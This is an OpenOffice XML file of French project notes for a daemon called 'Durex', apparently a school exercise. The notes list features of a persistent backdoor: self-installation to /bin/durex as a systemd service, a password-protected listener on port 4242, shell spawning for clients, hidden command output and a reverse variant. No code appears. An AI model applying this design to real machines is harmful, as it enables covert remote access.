      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://serverfault.com/questions/867322/what-is-the-difference-between-service-and-systemctl" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://serverfault.com/questions/867322/what-is-the-difference-between-service-and-systemctl</text:a> </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">NOTE : Pourquoi on ne voit pas <text:span text:style-name="T6">durex</text:span> avec une commande <text:span text:style-name="T6">service --status-all </text:span>: <text:span text:style-name="T1">man service</text:span> nous indique "service --status-all runs all init scripts, in alphabetical order, with the status command". En d'autres termes, seuls les <text:span text:style-name="T6">init scripts</text:span> (System V old-style daemons) sont montrés, pas nos daemons systemd (new-style). On peut cependant utiliser <text:span text:style-name="T6">service durex start</text:span> et <text:span text:style-name="T6">service durex stop</text:span>, puisque ça redirige sur systemctl.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Pour supprimer des daemons SysV : <text:span text:style-name="T6">clean.sh</text:span> du dossier de l'implémentation Old-Style.</text:p>
      <text:p text:style-name="P3">&gt; Pour supprimer des daemons systemd : <text:span text:style-name="T6">clean.sh</text:span> d'un des deux autres dossiers implémentant New-Styl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ODO :</text:p>
      <text:list xml:id="list6251899264656216813" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P45">[OK] Si la commande pkg-config échoue / qu'on la trouve pas, se rabattre sur /etc/systemd/system.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list32728998" text:continue-numbering="true" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P45">[OK] Système de mot de passe / authentification, pour éviter le mot de passe en clair.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list32714783" text:continue-numbering="true" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P45">[OK] Limiter à 3 clients.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list32736081" text:continue-numbering="true" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P45">[OK] Afficher un prompt, l'aide etc...</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list5797871723456337165" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P46">[OK] Ajouter une option pour <text:span text:style-name="T7">exit</text:span><text:span text:style-name="T9">.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list4661101854053788961" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P56">[OK] Le daemon se lance avec <text:span text:style-name="T6">stdbuf</text:span> (pour le logging). Voir si on garde ça. EDIT : gardons pour le mécanisme de log.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list2476506715761917020" text:style-name="L16">
        <text:list-item>
          <text:p text:style-name="P57">[OK] Si on lance Durex alors que le daemon tourne toujours, on ne peut écrire <text:span text:style-name="T6">/bin/durex</text:span> (existe déjà et tourne dans le cadre du daemon, donc impossibilité d'ouvrir en écriture).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list2890148940684136014" text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P58">[OK] La localisation du binaire cible est pour le moment hardcodée (/bin/durex), voir si on reste comme ça. EDIT : gardons, /bin est une localisation safe.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list4020686796603571360" text:style-name="L18">
        <text:list-item>
          <text:p text:style-name="P59">[OK] Neutraliser les outputs de commandes (comme systemctl enable) lors de l'exécution (exec_safe).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list2647023824152826469" text:style-name="L19">
        <text:list-item>
          <text:p text:style-name="P60">[OK] Consigne, "une seule instance du daemon doit pouvoir être lancée". Puisque le daemon écoute sur le port 4242, en effet une erreur sera renvoyée si on tente de lancer + d'une instance, mais essaye de lancer <text:span text:style-name="T6">/bin/Durex</text:span> (pour voir ce que ça fait ?).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list4398628853107763826" text:style-name="L20">
        <text:list-item>
          <text:p text:style-name="P61">[OK] Quand on spawn une shell, envoyer un message à <text:span text:style-name="T6">tous</text:span> les clients qui sont connectés à durex.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P6"/>
      <text:list xml:id="list3113149800102551600" text:style-name="L21">
        <text:list-item>
          <text:p text:style-name="P51"><text:span text:style-name="T9">[OK] Passer Durex_reverse en poll() aussi.</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5H51M8S</meta:editing-duration>
    <meta:editing-cycles>43</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-02-16T12:48:39.01</dc:date>
    <meta:document-statistic meta:table-count="1" meta:image-count="4" meta:object-count="0" meta:page-count="17" meta:paragraph-count="430" meta:word-count="5588" meta:character-count="37437"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>